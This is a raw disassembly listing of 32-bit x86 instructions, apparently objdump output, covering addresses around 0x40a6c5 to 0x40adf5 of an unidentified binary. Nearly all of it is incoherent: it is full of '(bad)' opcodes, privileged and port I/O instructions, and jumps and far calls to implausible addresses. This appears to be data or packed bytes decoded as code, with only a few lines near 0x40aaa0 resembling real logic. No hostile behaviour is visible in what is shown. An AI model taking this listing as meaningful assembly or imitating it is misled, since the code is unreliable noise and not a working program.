  40a6c5:	push   ebp
  40a6c6:	xor    edi,DWORD PTR [edx+0x28d4b10d]
  40a6cc:	sbb    BYTE PTR [ebx+0x21ff8393],al
  40a6d2:	push   ecx
  40a6d3:	adc    BYTE PTR [esi],bl
  40a6d5:	inc    edi
  40a6d6:	dec    edx
  40a6d7:	pop    esp
  40a6d8:	(bad)  
  40a6da:	mov    ?,WORD PTR [edx-0x10d4de76]
  40a6e0:	repz dec ebp
  40a6e2:	(bad)  
  40a6e3:	cmp    al,0x43
  40a6e5:	sbb    DWORD PTR [eax+ecx*4-0x2cc2c76a],ecx
  40a6ec:	sbb    eax,0x8918294d
  40a6f1:	mov    al,ah
  40a6f3:	sub    BYTE PTR [esi+0x4c4008a5],bl
  40a6f9:	sbb    DWORD PTR [edx+0x17],esi
  40a6fc:	into   
  40a6fd:	jno    0x40a697
  40a6ff:	ds inc edi
  40a701:	jp     0x40a71c
  40a703:	(bad)  
  40a704:	push   ebx
  40a705:	enter  0x6a9e,0xfd
  40a709:	cmp    edi,edx
  40a70b:	fldenv [ebx+0x70]
  40a70e:	lods   eax,DWORD PTR ds:[esi]
  40a70f:	out    dx,eax
  40a710:	(bad)  
  40a711:	push   DWORD PTR [esi]
  40a713:	sub    dl,bl
  40a715:	push   esp
  40a716:	data16 fadd QWORD PTR ds:0x81da0dcc
  40a71d:	cwde   
  40a71e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a71f:	fcomp  DWORD PTR [ebp-0x3f68bce]
  40a725:	out    dx,eax
  40a726:	shl    esi,1
  40a728:	mov    cl,BYTE PTR [esi]
  40a72a:	addr16 pop ebp
  40a72c:	in     al,dx
  40a72d:	adc    DWORD PTR [eax+0x55d042e0],eax
  40a733:	pop    esp
  40a734:	pop    edi
  40a735:	pusha  
  40a736:	push   es
  40a737:	jge    0x40a6f7
  40a739:	loopne 0x40a705
  40a73b:	pop    edi
  40a73c:	icebp  
  40a73d:	inc    ebx
  40a73e:	pop    ebx
  40a73f:	add    eax,0x10ec6d16
  40a744:	mov    ds:0xd4f43cfc,eax
  40a749:	loope  0x40a70e
  40a74b:	shl    dl,cl
  40a74d:	xchg   ebx,eax
  40a74e:	mov    cl,bl
  40a750:	push   cs
  40a751:	lods   al,BYTE PTR ds:[esi]
  40a752:	scas   eax,DWORD PTR es:[edi]
  40a753:	xor    DWORD PTR [eax-0x578a1260],ecx
  40a759:	xchg   edi,eax
  40a75a:	cmp    BYTE PTR [ecx],dh
  40a75c:	or     DWORD PTR [esp+ebp*2],eax
  40a75f:	pop    ss
  40a760:	popa   
  40a761:	out    dx,al
  40a762:	add    ebp,DWORD PTR [ebx]
  40a764:	jae    0x40a71c
  40a766:	inc    ecx
  40a767:	pushf  
  40a768:	cmp    al,0xf
  40a76a:	mov    al,BYTE PTR [ecx]
  40a76c:	sti    
  40a76d:	ret    0xd591
  40a770:	int3   
  40a771:	xchg   ebx,eax
  40a772:	and    al,0xa8
  40a774:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a775:	xchg   esi,eax
  40a776:	shl    dh,cl
  40a778:	inc    esp
  40a779:	cdq    
  40a77a:	sbb    eax,0x75087e2a
  40a77f:	pop    ss
  40a780:	or     ebp,0xb119727e
  40a786:	pop    esi
  40a787:	add    ch,ch
  40a789:	xor    ecx,ebp
  40a78b:	adc    cl,bl
  40a78d:	in     eax,0x80
  40a78f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a790:	out    dx,eax
  40a791:	mov    ecx,0xa8e64542
  40a796:	cli    
  40a797:	and    eax,0x5d47d2b0
  40a79c:	in     eax,0xa7
  40a79e:	mov    esi,0x85ec2570
  40a7a3:	xchg   DWORD PTR [ebp+0x41],edi
  40a7a6:	aam    0xb7
  40a7a8:	add    DWORD PTR [ebx+0x32adb119],edx
  40a7ae:	stc    
  40a7af:	sub    eax,0x176fd2f7
  40a7b4:	in     al,0x3d
  40a7b6:	dec    esp
  40a7b7:	push   0xffffffdc
  40a7b9:	xchg   BYTE PTR [edx+eiz*4],dl
  40a7bc:	jns    0x40a7cf
  40a7be:	imul   ebp,edx,0xffffff9f
  40a7c1:	jne    0x40a813
  40a7c3:	stc    
  40a7c4:	sbb    DWORD PTR [esi+0x6],0xffffffe2
  40a7c8:	xchg   BYTE PTR [ecx-0x1f],cl
  40a7cb:	pop    ds
  40a7cc:	xchg   ecx,eax
  40a7cd:	inc    ebx
  40a7ce:	pop    edi
  40a7cf:	arpl   ax,ax
  40a7d1:	adc    DWORD PTR [ebx+0x35],0xffffff94
  40a7d5:	mov    ecx,0xfbf2a5bb
  40a7da:	sbb    esp,ecx
  40a7dc:	shl    BYTE PTR [eax],0x52
  40a7df:	popa   
  40a7e0:	loop   0x40a7ed
  40a7e2:	mov    ebp,0x4ee01872
  40a7e7:	outs   dx,BYTE PTR ds:[esi]
  40a7e8:	repnz cmp ecx,DWORD PTR [eax+0x3f7bb95a]
  40a7ef:	stos   DWORD PTR es:[edi],eax
  40a7f0:	sub    eax,0xf149c9f8
  40a7f5:	dec    ebp
  40a7f6:	xor    ecx,DWORD PTR [ebp+0x71]
  40a7f9:	(bad)  
  40a7fa:	retf   
  40a7fb:	dec    esi
  40a7fc:	stos   BYTE PTR es:[edi],al
  40a7fd:	sub    DWORD PTR [edi-0x55108845],ebx
  40a803:	or     DWORD PTR [edi-0x45],ecx
  40a806:	and    DWORD PTR [ecx+0x1d5d4c88],eax
  40a80c:	and    eax,0xa093f4dc
  40a811:	pop    esi
  40a812:	xchg   edx,eax
  40a813:	mov    ebp,0xac82d146
  40a818:	and    BYTE PTR [eax+0x71438a29],cl
  40a81e:	fsubr  DWORD PTR [edi+ebp*4-0x19]
  40a822:	push   esp
  40a823:	inc    ecx
  40a824:	mov    ah,0xea
  40a826:	lods   al,BYTE PTR ds:[esi]
  40a827:	test   BYTE PTR [edx],dl
  40a829:	push   ecx
  40a82a:	or     BYTE PTR [esp+edi*2],cl
  40a82d:	pop    ebp
  40a82e:	into   
  40a82f:	(bad)  
  40a831:	inc    esp
  40a832:	xchg   ecx,eax
  40a833:	jbe    0x40a7bb
  40a835:	call   0x133c724d
  40a83a:	sar    ebx,cl
  40a83c:	add    BYTE PTR [ecx+ecx*8],bh
  40a83f:	gs xchg esp,eax
  40a841:	push   ebx
  40a842:	fstp   TBYTE PTR [edx+0x1d7c0bf7]
  40a848:	jl     0x40a801
  40a84a:	jns    0x40a842
  40a84c:	mov    dl,0xf8
  40a84e:	or     DWORD PTR [edx],ebp
  40a850:	adc    al,BYTE PTR fs:[eax+0x75dacafd]
  40a857:	xchg   ebx,eax
  40a858:	stos   BYTE PTR es:[edi],al
  40a859:	push   esi
  40a85a:	sbb    eax,0x82a10563
  40a85f:	int3   
  40a860:	xchg   edi,eax
  40a861:	mov    bl,0xea
  40a863:	pop    ebp
  40a864:	xchg   ecx,eax
  40a865:	aas    
  40a866:	cld    
  40a867:	pavgw  mm2,QWORD PTR [edi+edi*2]
  40a86b:	mov    ecx,0xd4ff2cc1
  40a870:	into   
  40a871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a872:	in     al,dx
  40a873:	ins    BYTE PTR es:[edi],dx
  40a874:	nop
  40a875:	inc    eax
  40a876:	ret    
  40a877:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a878:	es mov edi,0x910209cc
  40a87e:	out    0xcf,al
  40a880:	(bad)
  40a883:	cmp    eax,0x27892575
  40a888:	mov    edi,0xd0c29282
  40a88d:	jnp    0x40a829
  40a88f:	xchg   BYTE PTR [edi-0xdcabbcb],bl
  40a895:	adc    edi,DWORD PTR [ebp-0x238b2228]
  40a89b:	push   esp
  40a89c:	arpl   WORD PTR [ebx],bx
  40a89e:	pop    esp
  40a89f:	adc    esp,eax
  40a8a1:	jbe    0x40a878
  40a8a3:	(bad)  
  40a8a4:	mov    ?,WORD PTR [ebx-0x6441fc5]
  40a8aa:	repnz mov dh,BYTE PTR [esi-0x5906d3c9]
  40a8b1:	pushf  
  40a8b2:	sbb    al,0xb0
  40a8b4:	call   0x5ed18d02
  40a8b9:	mov    ds:0x8ff52a4d,al
  40a8be:	xchg   ecx,eax
  40a8bf:	mov    al,ds:0xbab78899
  40a8c4:	jp     0x40a886
  40a8c6:	aad    0xf0
  40a8c8:	outs   dx,BYTE PTR ds:[esi]
  40a8c9:	iret   
  40a8ca:	inc    DWORD PTR ds:0xa492aa59
  40a8d0:	hlt    
  40a8d1:	cmp    edi,esp
  40a8d3:	ds stos DWORD PTR es:[edi],eax
  40a8d5:	xchg   DWORD PTR [edi],esi
  40a8d7:	ficom  DWORD PTR [edi+0x1e704f02]
  40a8dd:	ss inc ebx
  40a8df:	dec    esi
  40a8e0:	icebp  
  40a8e1:	(bad)  
  40a8e2:	stos   DWORD PTR es:[edi],eax
  40a8e3:	neg    DWORD PTR gs:[edi+0x2c]
  40a8e7:	std    
  40a8e8:	ins    DWORD PTR es:[edi],dx
  40a8e9:	mov    ch,0xe4
  40a8eb:	aaa    
  40a8ec:	lock push ecx
  40a8ee:	adc    ah,dl
  40a8f0:	jne    0x40a8a6
  40a8f2:	repnz fucomip st,st(6)
  40a8f5:	xor    dh,ah
  40a8f7:	ja     0x40a908
  40a8f9:	mov    ds:0xc39c0d75,al
  40a8fe:	push   ss
  40a8ff:	jns    0x40a911
  40a901:	mov    edx,0xd517a356
  40a906:	jae    0x40a975
  40a908:	cli    
  40a909:	xchg   ecx,eax
  40a90a:	fsubr  QWORD PTR [ecx-0x33]
  40a90d:	pop    eax
  40a90e:	call   0xc27baba8
  40a913:	repz or eax,0x7f9324fb
  40a919:	sub    edx,DWORD PTR [edx]
  40a91b:	test   DWORD PTR [edi+0x25abd318],ecx
  40a921:	js     0x40a8a3
  40a923:	inc    edi
  40a924:	and    al,0x5e
  40a926:	xchg   edi,eax
  40a927:	(bad)  
  40a928:	cmp    eax,0x3f8f2fbb
  40a92d:	mov    bl,BYTE PTR [edx-0x7f0c43d3]
  40a933:	jnp    0x40a9af
  40a935:	dec    eax
  40a936:	cli    
  40a937:	inc    eax
  40a938:	dec    ebx
  40a939:	xchg   edi,eax
  40a93a:	imul   ecx,ebp,0xe
  40a93d:	loop   0x40a992
  40a93f:	pop    ebx
  40a940:	(bad)  
  40a941:	in     al,dx
  40a942:	pushf  
  40a943:	adc    BYTE PTR [ecx-0x401789a],ch
  40a949:	push   esp
  40a94a:	in     eax,0x83
  40a94c:	pop    edi
  40a94d:	bound  edi,QWORD PTR gs:[ecx]
  40a950:	mov    al,BYTE PTR [ebp-0x1e]
  40a953:	ins    DWORD PTR es:[edi],dx
  40a954:	sbb    BYTE PTR [edi],cl
  40a956:	loope  0x40a947
  40a958:	jno    0x40a9c0
  40a95a:	pop    edi
  40a95b:	mov    gs,ebx
  40a95d:	cmc    
  40a95e:	add    BYTE PTR [ebx+0x18],bh
  40a961:	retf   
  40a962:	nop
  40a963:	into   
  40a964:	mov    ?,WORD PTR [edi]
  40a966:	sub    ch,cl
  40a968:	sti    
  40a969:	add    BYTE PTR [eax+edx*1+0x5a],ah
  40a96d:	xchg   BYTE PTR [edx+0x1f],bl
  40a970:	icebp  
  40a971:	jl     0x9bf02f4e
  40a977:	pop    ebx
  40a978:	sub    DWORD PTR ds:0xeae18745,edi
  40a97e:	sub    DWORD PTR [eax-0x42],0xffffff9a
  40a982:	mov    edx,0x956bad8d
  40a987:	mov    WORD PTR [edx],gs
  40a989:	push   eax
  40a98a:	(bad)  
  40a98b:	add    al,0x75
  40a98d:	test   DWORD PTR [ecx],esp
  40a98f:	fsub   QWORD PTR [eax+ebx*4+0x2a]
  40a993:	xchg   esp,eax
  40a994:	daa    
  40a995:	adc    BYTE PTR [ebx],cl
  40a997:	dec    eax
  40a998:	or     BYTE PTR [eax+0x14f83de6],0x73
  40a99f:	adc    eax,0x89478d8d
  40a9a4:	push   cs
  40a9a5:	and    cl,dl
  40a9a7:	les    edi,FWORD PTR [edx+0x54]
  40a9aa:	(bad)  
  40a9ac:	mov    cl,BYTE PTR [esi-0x6d7e26a5]
  40a9b2:	aaa    
  40a9b3:	mov    ebp,0x911a2174
  40a9b8:	les    edx,FWORD PTR [ecx-0x2e]
  40a9bb:	fcomip st,st(1)
  40a9bd:	scas   eax,DWORD PTR es:[edi]
  40a9be:	jae    0x40a9b2
  40a9c0:	(bad)  
  40a9c1:	imul   ebx,edi,0x31
  40a9c4:	mov    ecx,DWORD PTR ss:[edx]
  40a9c7:	js     0x40a967
  40a9c9:	pushf  
  40a9ca:	sti    
  40a9cb:	pop    eax
  40a9cc:	scas   al,BYTE PTR es:[edi]
  40a9cd:	retf   0x5beb
  40a9d0:	mov    ah,0x2a
  40a9d2:	aam    0x54
  40a9d4:	loope  0x40a9b6
  40a9d6:	cmp    DWORD PTR [edi],esp
  40a9d8:	sbb    al,0x76
  40a9da:	lds    esp,FWORD PTR [edx-0x43]
  40a9dd:	push   eax
  40a9df:	xchg   edi,eax
  40a9e0:	aam    0xb3
  40a9e2:	dec    edx
  40a9e3:	mov    esi,0xe3f9576e
  40a9e8:	fidivr DWORD PTR [edx+0x605a0783]
  40a9ee:	nop
  40a9ef:	leave  
  40a9f0:	shl    BYTE PTR [ebx],0x85
  40a9f3:	call   0x5af3:0x35a77e4b
  40a9fa:	iret   
  40a9fb:	icebp  
  40a9fc:	mov    ch,0x9d
  40a9fe:	aaa    
  40a9ff:	sbb    BYTE PTR [ecx-0x2c17f696],bl
  40aa05:	jmp    0xbdf5fd91
  40aa0a:	jbe    0x40a9a0
  40aa0c:	sbb    ah,0x94
  40aa0f:	pop    ss
  40aa10:	mov    eax,0xeac51ee3
  40aa15:	nop
  40aa16:	std    
  40aa17:	daa    
  40aa18:	adc    DWORD PTR [esi-0x763b1428],0x53
  40aa1f:	jl     0x40a9bc
  40aa21:	pop    esi
  40aa22:	fdivr  st,st(5)
  40aa24:	loopne 0x40aa99
  40aa26:	or     BYTE PTR [si],dh
  40aa29:	mov    al,0xb5
  40aa2b:	add    ebp,edi
  40aa2d:	mov    ds:0x7110fc46,al
  40aa32:	gs pop eax
  40aa34:	jbe    0x40aa17
  40aa36:	adc    eax,0x8c6cba24
  40aa3b:	sbb    al,0xa4
  40aa3d:	sahf   
  40aa3e:	std    
  40aa3f:	cmp    ebx,eax
  40aa41:	and    dl,bl
  40aa43:	test   DWORD PTR [edx],0x83a43aa
  40aa49:	in     al,dx
  40aa4a:	rol    DWORD PTR [ecx],cl
  40aa4c:	or     bl,BYTE PTR [ecx+0x7f6b8c05]
  40aa52:	pop    es
  40aa53:	mov    edx,0xca304614
  40aa58:	sbb    ch,BYTE PTR [edi-0x306662fd]
  40aa5e:	pop    ds
  40aa5f:	push   ebp
  40aa60:	cli    
  40aa61:	add    bl,dh
  40aa63:	mov    esp,DWORD PTR [ebx]
  40aa65:	sti    
  40aa66:	cmp    bl,BYTE PTR [ecx+0x3cb93c82]
  40aa6c:	dec    ecx
  40aa6d:	fcomp  DWORD PTR [ecx-0x39dd17ed]
  40aa73:	xchg   DWORD PTR [edi+0x2ad6093a],esp
  40aa79:	out    0xe1,al
  40aa7b:	inc    ebx
  40aa7c:	mov    bl,0x69
  40aa7e:	and    bh,BYTE PTR [ebx]
  40aa80:	and    BYTE PTR [ebp-0x71],bh
  40aa83:	jmp    0x40aade
  40aa85:	not    eax
  40aa87:	and    al,0x2c
  40aa89:	mov    ebx,0x3484df57
  40aa8e:	xchg   edi,eax
  40aa8f:	xchg   DWORD PTR [ebx],esi
  40aa91:	sar    DWORD PTR [edx+0x3272db],0x3
  40aa98:	ret    0x4589
  40aa9b:	or     BYTE PTR [ebx-0x3ecc13bb],cl
  40aaa1:	add    eax,edx
  40aaa3:	mov    edx,DWORD PTR [ebp+0x14]
  40aaa6:	imul   eax,DWORD PTR [edx]
  40aaa9:	mov    edx,DWORD PTR [ebp-0x4]
  40aaac:	xor    edx,ecx
  40aaae:	mov    ecx,DWORD PTR [ebp+0x8]
  40aab1:	lea    ecx,[edx+ecx*1+0x3272db]
  40aab8:	jmp    0x40ce47
  40aabd:	inc    esi
  40aabe:	outs   dx,DWORD PTR ds:[esi]
  40aabf:	mov    esp,0x5a393f3
  40aac4:	outs   dx,DWORD PTR ds:[esi]
  40aac5:	rcl    bl,cl
  40aac7:	mov    edx,0xecdc56bc
  40aacc:	fwait
  40aacd:	push   esp
  40aace:	hlt    
  40aacf:	bound  esp,QWORD PTR [edx+0x10]
  40aad2:	pop    edi
  40aad3:	bound  esp,QWORD PTR [edx-0x76]
  40aad6:	push   ecx
  40aad7:	mov    cs,edx
  40aad9:	add    ebp,esp
  40aadb:	ret    
  40aadc:	adc    al,BYTE PTR [edi+ecx*2]
  40aadf:	mov    dl,0xc5
  40aae1:	rcr    ebp,cl
  40aae3:	inc    ebx
  40aae4:	mov    dl,0x85
  40aae6:	(bad)  
  40aae7:	aam    0xc1
  40aae9:	jno    0x40aa92
  40aaeb:	sub    al,0xf5
  40aaed:	shr    BYTE PTR [esi+0x17],cl
  40aaf0:	test   DWORD PTR [ebp+0x40],ebx
  40aaf3:	lock out 0x88,eax
  40aaf6:	mov    DWORD PTR ds:0x58a926fb,ecx
  40aafc:	arpl   WORD PTR [edi+0x53],cx
  40aaff:	push   es
  40ab00:	mov    ebp,DWORD PTR [ebx*2+0x4af090f8]
  40ab07:	mov    WORD PTR [edx+0x68d26339],gs
  40ab0d:	sub    ch,BYTE PTR [eax-0x3ffd75c7]
  40ab13:	inc    ebp
  40ab14:	ins    DWORD PTR es:[edi],dx
  40ab15:	ja     0x40aae4
  40ab17:	pop    esp
  40ab18:	xor    al,0x90
  40ab1a:	xchg   ebp,eax
  40ab1b:	inc    esi
  40ab1c:	jl     0x40aab0
  40ab1e:	dec    edx
  40ab1f:	imul   ebp,ebx,0x1afbab5d
  40ab25:	punpcklwd mm3,DWORD PTR [ebp-0x49]
  40ab29:	dec    esp
  40ab2a:	or     al,0xb
  40ab2c:	scas   eax,DWORD PTR es:[edi]
  40ab2d:	xchg   ebp,eax
  40ab2e:	test   eax,0xda4a323e
  40ab33:	adc    eax,0xe4b8209e
  40ab38:	das    
  40ab39:	xchg   esi,eax
  40ab3a:	adc    al,0x38
  40ab3c:	inc    esp
  40ab3d:	lahf   
  40ab3e:	rcr    BYTE PTR [ebx+eiz*1+0xa],0x52
  40ab43:	jbe    0x40aafc
  40ab45:	repz das 
  40ab47:	stos   BYTE PTR es:[edi],al
  40ab48:	jo     0x40aafa
  40ab4a:	mov    ebp,0xf846fc7a
  40ab4f:	packsswb mm7,QWORD PTR [edi]
  40ab52:	cmp    ebx,esp
  40ab54:	cmp    BYTE PTR [ecx+0x3b],dh
  40ab57:	call   0x1239:0xf170c725
  40ab5e:	pop    ebp
  40ab5f:	sbb    bh,0xfe
  40ab62:	in     al,0x2b
  40ab64:	outs   dx,DWORD PTR ds:[esi]
  40ab65:	xchg   eax,ebx
  40ab67:	push   cs
  40ab68:	dec    esi
  40ab69:	nop
  40ab6a:	cmp    ebx,ecx
  40ab6c:	addr16 imul esp,edx,0xdcc06396
  40ab73:	test   DWORD PTR [edi-0x35e884bc],0x5d5c475d
  40ab7d:	in     eax,dx
  40ab7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab7f:	and    eax,0xf10bed0c
  40ab84:	jle    0x40abd9
  40ab86:	std    
  40ab87:	stos   BYTE PTR es:[edi],al
  40ab88:	bound  ebp,QWORD PTR [ebp+ecx*1+0x71]
  40ab8c:	push   esp
  40ab8d:	dec    eax
  40ab8e:	into   
  40ab8f:	jne    0x40abc0
  40ab91:	js     0x40ab67
  40ab93:	pop    bx
  40ab95:	dec    esp
  40ab96:	add    bh,BYTE PTR [esi+0x5c1f4ef9]
  40ab9c:	push   ds
  40ab9d:	jecxz  0x40abee
  40ab9f:	or     eax,0xbd113664
  40aba4:	dec    ecx
  40aba5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aba6:	jne    0x40ab35
  40aba8:	jge    0x40ab75
  40abaa:	popf   
  40abab:	sbb    esp,ecx
  40abad:	pop    ecx
  40abae:	jns    0x40ab89
  40abb0:	push   es
  40abb1:	and    al,0xf6
  40abb3:	pop    edi
  40abb4:	and    BYTE PTR [edi-0x2c],0x77
  40abb8:	jns    0x40abc1
  40abba:	call   0xb4a28d1
  40abbf:	jne    0x40ab46
  40abc1:	cmp    BYTE PTR [ebp+0x4e958b0d],dl
  40abc7:	and    ebx,DWORD PTR [ecx+esi*2+0x52ae5571]
  40abce:	out    dx,eax
  40abcf:	ja     0x40abd7
  40abd1:	inc    ebx
  40abd2:	pop    esp
  40abd3:	shl    ch,0x35
  40abd6:	sub    BYTE PTR [esi],cl
  40abd8:	add    BYTE PTR ds:0xb5f8e762,0x37
  40abdf:	sub    al,0xd1
  40abe1:	jno    0x40ab88
  40abe3:	nop
  40abe4:	loop   0x40ab97
  40abe6:	es loope 0x40abbe
  40abe9:	fwait
  40abea:	xchg   ebx,eax
  40abeb:	pushf  
  40abec:	iret   
  40abed:	adc    DWORD PTR [eax+0x3b],esi
  40abf0:	sub    eax,0x38065162
  40abf5:	sub    eax,0x54dec23f
  40abfa:	mov    ecx,cs
  40abfc:	into   
  40abfd:	jp     0x40ab85
  40abff:	sahf   
  40ac00:	lahf   
  40ac01:	mov    edi,ecx
  40ac03:	pop    esp
  40ac04:	mov    BYTE PTR [ebx],al
  40ac06:	mov    ds:0x98a5b7f5,eax
  40ac0b:	push   edx
  40ac0c:	or     eax,0xf4c4afff
  40ac11:	cmp    esp,esp
  40ac13:	pop    eax
  40ac14:	and    ch,ah
  40ac16:	ss in  eax,dx
  40ac18:	xchg   ecx,eax
  40ac19:	imul   ebp,esi,0xc51ba15
  40ac1f:	jl     0x40abfa
  40ac21:	push   esp
  40ac22:	retf   
  40ac23:	adc    BYTE PTR [edx],cl
  40ac25:	jae    0x40ac6f
  40ac27:	add    al,0x7f
  40ac29:	push   ss
  40ac2a:	call   0x916d:0x8a0dae05
  40ac31:	mov    ch,0x94
  40ac33:	sub    BYTE PTR [esi+0x7c2bf4b4],al
  40ac39:	jg     0x40acb3
  40ac3b:	pop    esi
  40ac3c:	clc    
  40ac3d:	xchg   ebx,eax
  40ac3e:	int3   
  40ac3f:	ins    BYTE PTR es:[edi],dx
  40ac40:	sbb    al,0xfa
  40ac42:	repnz stos DWORD PTR es:[edi],eax
  40ac44:	arpl   WORD PTR [ebx+0x29],sp
  40ac47:	sub    bh,BYTE PTR [ebp-0x2787123e]
  40ac4d:	rcr    DWORD PTR [eax],0xe7
  40ac50:	dec    ecx
  40ac51:	mov    ds:0x55e8b5af,al
  40ac56:	sti    
  40ac57:	fsubr  QWORD PTR [ecx]
  40ac59:	mov    bl,0x8b
  40ac5b:	mov    ds:0x74968a46,al
  40ac60:	dec    edi
  40ac61:	jge    0x40ac28
  40ac63:	fimul  DWORD PTR [edi-0x74]
  40ac66:	in     al,dx
  40ac67:	inc    ebx
  40ac68:	sahf   
  40ac69:	(bad)  
  40ac6a:	jns    0x40acbe
  40ac6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac6d:	mov    edi,0x709a5dce
  40ac72:	iret   
  40ac73:	mov    bh,ch
  40ac75:	repz jle 0x40ac95
  40ac78:	sbb    edi,0x1443bd14
  40ac7e:	sub    BYTE PTR [ebp-0x57b8a9f1],bh
  40ac84:	dec    eax
  40ac85:	jns    0x40ac28
  40ac87:	sub    dh,BYTE PTR [ecx+0x3269112]
  40ac8d:	pusha  
  40ac8e:	fstp   TBYTE PTR [eax+edi*2+0x5a]
  40ac92:	popf   
  40ac93:	fsub   DWORD PTR [esi+0x700db735]
  40ac99:	dec    ebx
  40ac9a:	in     al,0xe5
  40ac9c:	xlat   BYTE PTR ds:[ebx]
  40ac9d:	or     esi,DWORD PTR [ebx+0x725aec25]
  40aca3:	xlat   BYTE PTR ds:[ebx]
  40aca4:	and    al,0x1c
  40aca6:	vpaddsw xmm6,xmm6,XMMWORD PTR [eax-0x7c395657]
  40acae:	pop    esi
  40acaf:	jmp    0x40ad13
  40acb1:	sbb    edi,0xf32f3231
  40acb7:	push   ebx
  40acb8:	popf   
  40acb9:	mov    ecx,0xfac5b1b7
  40acbe:	imul   DWORD PTR [ebx+0x44]
  40acc1:	imul   edx,eax,0xffffffc7
  40acc4:	pop    eax
  40acc5:	imul   edx,DWORD PTR [edi+0xa585fb3],0xffffffe2
  40accc:	ins    DWORD PTR es:[edi],dx
  40accd:	sub    esi,DWORD PTR [ebx+0x2c]
  40acd0:	inc    esp
  40acd1:	inc    edx
  40acd2:	push   ebx
  40acd3:	add    BYTE PTR [esi+eax*8],ch
  40acd6:	je     0x40ad2b
  40acd8:	cmp    bh,ch
  40acda:	pop    ebx
  40acdb:	rcr    BYTE PTR [eax+0xf],1
  40acde:	repz cdq 
  40ace0:	rol    DWORD PTR [edi+0x6526c9f6],1
  40ace6:	out    dx,eax
  40ace7:	test   dl,bl
  40ace9:	nop
  40acea:	push   ds
  40aceb:	idiv   eax
  40aced:	pop    eax
  40acee:	ror    BYTE PTR [esi+0x67],1
  40acf1:	fstp   TBYTE PTR [esi+0x2e]
  40acf4:	fstp   QWORD PTR [edi]
  40acf6:	pop    eax
  40acf7:	cdq    
  40acf8:	adc    al,0xa6
  40acfa:	inc    edi
  40acfb:	pop    edi
  40acfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acfd:	daa    
  40acfe:	dec    edi
  40acff:	or     bl,BYTE PTR [ebx-0x50]
  40ad02:	in     eax,dx
  40ad03:	jmp    0x40acab
  40ad05:	and    al,0xa2
  40ad07:	sub    esi,DWORD PTR [edi]
  40ad09:	sbb    BYTE PTR [ecx+0x5d344d8e],dl
  40ad0f:	jg     0x40acc6
  40ad11:	mov    ah,0xa1
  40ad13:	call   0xe9067b90
  40ad18:	jmp    0x40acf6
  40ad1a:	mov    ebp,DWORD PTR [eax+0x34]
  40ad1d:	push   edx
  40ad1e:	push   esp
  40ad1f:	sti    
  40ad20:	lea    esi,[ecx-0x683713d8]
  40ad26:	pusha  
  40ad27:	aas    
  40ad28:	sub    eax,0xf8e151d3
  40ad2d:	and    BYTE PTR [ecx-0x39cad0b1],ch
  40ad33:	sub    BYTE PTR [ebp-0x34],bl
  40ad36:	push   edi
  40ad37:	les    esp,FWORD PTR [edx-0x2f]
  40ad3a:	mov    BYTE PTR [edi-0x27],bl
  40ad3d:	and    eax,0xf75eff29
  40ad42:	cli    
  40ad43:	jmp    0x18bc48e6
  40ad48:	dec    edi
  40ad49:	mov    dh,0xf
  40ad4b:	cmc    
  40ad4c:	xchg   ebx,eax
  40ad4d:	jne    0x40ad8f
  40ad4f:	mov    esi,0x9fe17ee6
  40ad54:	rcl    eax,1
  40ad56:	mov    BYTE PTR ds:0x17ae486a,bh
  40ad5c:	inc    ebx
  40ad5d:	mov    ebp,0x49cc39f2
  40ad62:	push   ss
  40ad63:	test   DWORD PTR [edi],ecx
  40ad65:	cdq    
  40ad66:	fs dec ebx
  40ad68:	adc    al,0x37
  40ad6a:	cld    
  40ad6b:	xchg   eax,ebp
  40ad6d:	ins    BYTE PTR es:[edi],dx
  40ad6e:	leave  
  40ad6f:	pusha  
  40ad70:	ins    BYTE PTR es:[edi],dx
  40ad71:	ror    ebx,1
  40ad73:	sub    eax,0x1b1638f0
  40ad78:	(bad)  
  40ad79:	ins    DWORD PTR es:[edi],dx
  40ad7a:	icebp  
  40ad7b:	push   ds
  40ad7c:	hlt    
  40ad7d:	es jle 0x40adac
  40ad80:	inc    eax
  40ad81:	push   ss
  40ad82:	scas   al,BYTE PTR es:[edi]
  40ad83:	mov    DWORD PTR [ecx-0x4c],0x5b35afc0
  40ad8a:	inc    edi
  40ad8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad8c:	fst    DWORD PTR [edi+eiz*2+0x4b69f97a]
  40ad93:	aad    0xfc
  40ad95:	out    0xf5,al
  40ad97:	mov    ebx,0xd9badc7f
  40ad9c:	inc    esi
  40ad9d:	cmp    BYTE PTR cs:[ecx+0x2818e2a8],0x17
  40ada5:	inc    esp
  40ada6:	mov    esi,0xcb8e795e
  40adab:	sbb    DWORD PTR [eax],esp
  40adad:	fcom   QWORD PTR fs:[eax-0x5f]
  40adb1:	(bad)  
  40adb2:	(bad)  
  40adb3:	jb     0x40ad3c
  40adb5:	out    dx,eax
  40adb6:	mov    dl,0xbd
  40adb8:	nop
  40adb9:	adc    BYTE PTR [edi+0x59],bl
  40adbc:	hlt    
  40adbd:	jecxz  0x40ad46
  40adbf:	out    0x76,eax
  40adc1:	ror    DWORD PTR [ecx*8-0x7cf2ad2b],0x7b
  40adc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adca:	rol    cl,1
  40adcc:	nop
  40adcd:	jnp    0x40adea
  40adcf:	adc    dl,ch
  40add1:	add    al,BYTE PTR [esi]
  40add3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40add4:	mov    ebx,0x2ca0fedb
  40add9:	lods   al,BYTE PTR ds:[esi]
  40adda:	mov    WORD PTR [ebx-0x4019f6ed],?
  40ade0:	das    
  40ade1:	add    al,0xb6
  40ade3:	xlat   BYTE PTR ds:[ebx]
  40ade4:	cdq    
  40ade5:	pop    es
  40ade6:	dec    ebp
  40ade7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ade8:	xchg   ebx,eax
  40ade9:	mov    al,ds:0x2f10d816
  40adee:	pop    ecx
  40adef:	das    
  40adf0:	inc    edi
  40adf1:	push   cs
  40adf2:	or     bh,cl
  40adf4:	scas   eax,DWORD PTR es:[edi]
  40adf5:	std    
